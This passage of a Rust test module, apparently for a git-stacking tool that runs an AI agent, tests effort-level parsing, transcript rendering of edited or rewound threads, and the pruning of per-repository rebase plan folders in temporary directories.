        assert_eq!(at_effort(theirs.clone(), None), theirs);
        // The levels as claude takes them, the least first, high unless
        // picked.
        assert_eq!(Effort::ALL.map(Effort::name), ["low", "medium", "high", "xhigh", "max"]);
        assert_eq!((Effort::default(), Effort::parse("xhigh"), Effort::parse("huge")), (Effort::High, Some(Effort::Xhigh), None));
        assert_eq!(Effort::listed(), "low, medium, high, xhigh or max");
        assert!(Effort::Low < Effort::Max);
    }

    #[test]
    fn the_agent_is_told_the_thread_as_it_stands() {
        // Its turn trimmed, it is told it as you left it; rewound from your
        // question, it is told only the new one.
        let text = append_turn("why?", Role::Agent, "Because, at length.", Some("answer"));
        let text = append_turn(&text, Role::You, "and here?", None);
        let text = crate::thread::edit_turn(&text, 1, "Because.").unwrap();
        assert_eq!(transcript(&text), "The user: why?\nYou (the agent, earlier): Because.\nThe user: and here?");
        let text = crate::thread::rewind(&text, 0, "why, really?").unwrap();
        assert_eq!(transcript(&text), "The user: why, really?");
        // A turn deleted the first way is told to no one.
        assert_eq!(transcript("why?\n```deleted agent answer\n> Because.\n```\nand here?"), "The user: why?\nThe user: and here?");
    }

    /// A git directory of the test's own, `tmp/NAME/.git`: its path.
    fn git_dir(tmp: &Path, name: &str) -> String {
        let dir = tmp.join(name).join(".git");
        std::fs::create_dir_all(&dir).unwrap();
        dir.to_string_lossy().into_owned()
    }

    #[test]
    fn a_plan_s_folder_is_pruned_once_its_git_directory_is_gone() {
        // The plans' folder is the test's own: never the temporary
        // directory's, which every stacked shares.
        let dir = tempfile::tempdir().unwrap();
        let (tmp, base) = (dir.path(), dir.path().join("plans"));
        let live = plan_folder(&base, &git_dir(tmp, "live")).unwrap();
        let rebasing = plan_folder(&base, &git_dir(tmp, "rebasing")).unwrap();
        std::fs::create_dir(tmp.join("rebasing/.git/rebase-merge")).unwrap();
        let dead = plan_folder(&base, &git_dir(tmp, "dead")).unwrap();
        std::fs::write(dead.join("REBASE_TODO"), "pick 0123abc one\n").unwrap();
        let running = plan_folder(&base, &git_dir(tmp, "running")).unwrap();
        for gone in ["dead", "running"] {
            std::fs::remove_dir_all(tmp.join(gone)).unwrap();
        }
        // Each folder names its git directory in full, as its name cannot.
        assert_eq!(plan_gitdir(&live), Some(tmp.join("live/.git")));
        // A folder that a stacked of before made names none; nor does one
        // whose file names a git directory that is not the folder's.
        let before = base.join("0123456789ab");
        std::fs::create_dir(&before).unwrap();
        let written_over = base.join("ba9876543210");
        std::fs::create_dir(&written_over).unwrap();
        std::fs::write(written_over.join(GITDIR), format!("{}\n", tmp.join("dead/.git").display())).unwrap();
        assert_eq!(plan_gitdir(&written_over), None);
        // What is not a plan's folder is never touched.
        let other = base.join("notes");
        std::fs::create_dir(&other).unwrap();
        std::fs::write(base.join("0123456789ac"), "a file\n").unwrap();
        // The folder whose git directory is gone goes; not one whose git
        // directory is there, rebase or not; not one that an ask still
        // running writes its plan in, though its git directory is gone.
        let busy = HashSet::from([running.clone()]);
        let now = std::time::SystemTime::now();
        prune_plans(&base, &busy, now);
        assert!(!dead.exists());
        for kept in [&live, &rebasing, &running, &before, &written_over, &other, &base.join("0123456789ac")] {
            assert!(kept.exists(), "{} is kept", kept.display());
        }
        // The folders that name no git directory go once nothing in them
        // has changed for a day.
        prune_plans(&base, &busy, now + std::time::Duration::from_secs(25 * 60 * 60));
        assert!(!before.exists() && !written_over.exists());
        for kept in [&live, &rebasing, &running, &other] {
            assert!(kept.exists(), "{} is kept", kept.display());
        }
        // Its ask landed, the folder whose git directory is gone goes too.
        prune_plans(&base, &HashSet::new(), now);
        assert!(!running.exists() && live.exists() && rebasing.exists());
        // An ask's rebase step, starting, makes the folder of its worktree's
        // git directory, a plan an earlier ask left there gone.
        let repo = tmp.join("repo");
        std::fs::create_dir(&repo).unwrap();
        git::git(&repo, &["init", "-q"]).unwrap();
        let gitdir = repo.canonicalize().unwrap().join(".git");
        let folder = base.join(crate::diff::sha1_12(&gitdir.to_string_lossy()));
        std::fs::create_dir(&folder).unwrap();
        std::fs::write(folder.join("REBASE_TODO"), "drop 0123abc one\n").unwrap();
        let todo = rebase_todo(&base, &repo, &HashSet::new()).unwrap();
        assert_eq!(todo, folder.join("REBASE_TODO"));
        assert!(!todo.exists() && plan_gitdir(&folder) == Some(gitdir));
    }

    #[test]
    fn a_landed_ask_s_plan_goes_unless_a_rebase_may_still_want_it() {
        // The plans' folder and the database are the test's own.
        let dir = tempfile::tempdir().unwrap();
        let (tmp, base) = (dir.path(), dir.path().join("plans"));
        let db_path = tmp.join("db.jsonl");
        let started = |id: &str, plan: &Path| Run {
            id: id.into(),
            state: RunState::Started,
            ask: Some(serde_json::json!({"way": Way::Change, "scope": Scope::Stack, "from": 0, "notes": [], "todo": plan})),
            ..Default::default()
        };
        // Three folders, each for a git directory that is still there.
        let alone = plan_folder(&base, &git_dir(tmp, "alone")).unwrap();
        let shared = plan_folder(&base, &git_dir(tmp, "shared")).unwrap();
        let rebasing = plan_folder(&base, &git_dir(tmp, "rebasing")).unwrap();
        std::fs::create_dir(tmp.join("rebasing/.git/rebase-apply")).unwrap();
        Db::edit(&db_path, |db| {
            for (id, plan) in [("r1", &alone), ("r2", &shared), ("r3", &shared), ("r4", &rebasing)] {
                db.add_run(started(id, plan))?;
            }
            Ok(())
        })
        .unwrap();
        // Landed, failed or not, an ask's folder goes, though its worktree
        // is still there.
        assert_eq!(land(&db_path, "r1", Some("1")).unwrap().state, RunState::Failed);
        assert!(!alone.exists());
        // Not while another ask still running writes its plan there.
        land(&db_path, "r2", Some("1")).unwrap();
        assert!(shared.exists());
        land(&db_path, "r3", Some("1")).unwrap();
        assert!(!shared.exists());
        // Nor while a rebase is under way in its git directory.
        land(&db_path, "r4", Some("1")).unwrap();
        assert!(rebasing.exists());
    }

    #[test]
    fn the_plans_are_kept_where_the_environment_says() {
        // `$STACKED_TODO`, from where stacked runs; else the temporary
        // directory's, which every stacked shares.
        let named = PathBuf::from("/tmp/plans");
        assert_eq!(plans_from(|k| (k == "STACKED_TODO").then(|| named.clone().into())), named);
        assert!(plans_from(|_| Some("plans".into())).is_absolute());
        assert_eq!(plans_from(|_| None), std::env::temp_dir().join("stacked-todo"));
        assert_eq!(plans_from(|_| Some("".into())), std::env::temp_dir().join("stacked-todo"));
        // In the tests' own processes, which the binary never set up: beside
        // the database.
        assert_eq!(plans(Path::new("/tmp/t/db.jsonl")), Path::new("/tmp/t/stacked-todo"));
    }
}
